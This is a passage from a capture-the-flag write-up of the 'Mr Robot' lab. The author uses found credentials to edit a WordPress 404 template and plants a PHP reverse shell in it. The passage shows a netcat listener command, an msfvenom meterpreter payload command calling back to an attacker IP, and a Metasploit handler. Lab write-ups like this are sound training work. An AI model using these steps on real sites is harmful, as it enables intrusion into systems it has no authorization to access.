Using the credentials we found, we log in and are presented with Elliot's WordPress dashboard. After looking around, we see that we have access to a theme editor.

<center>

![b012d5df19bf44bae95653fc177520dc.png](/Mr%20Robot%20CTF/_resources/b012d5df19bf44bae95653fc177520dc-1.png)

![adb31d6238f4c3cc826c5740b82fdf54.png](/Mr%20Robot%20CTF/_resources/adb31d6238f4c3cc826c5740b82fdf54-1.png)

</center>

We will edit the 404 Template; our goal is to upload a reverse shell using this editor in order to get command execution of the underlying machine. Set up a netcat lister with `rlwrap nc -lvnp 9999`. (`rlwrap` is used to get a slightly better shell.) At this point, we can generate a php reverse shell payload using msfvenom: `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.6.30.43 LPORT=9999 -f raw -o payload.php`. We would then set up our handler with Metasploit with `exploit/multi/handler`
and with payload `php/meterpreter/reverse_tcp`.

Alternatively, we can use [Pentestmonkey's php reverse shell script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). This is what we'll do. Make the appropriate changes to the script, update the 404 Template file, and navigate to `10.10.89.74/404.php`. We see that this gives a reverse shell, and so we have an initial foothold.

<center>

![9c52f3524f4ec6a5d6cf6c6ee75dea9e.png](/Mr%20Robot%20CTF/_resources/9c52f3524f4ec6a5d6cf6c6ee75dea9e-1.png)

</center>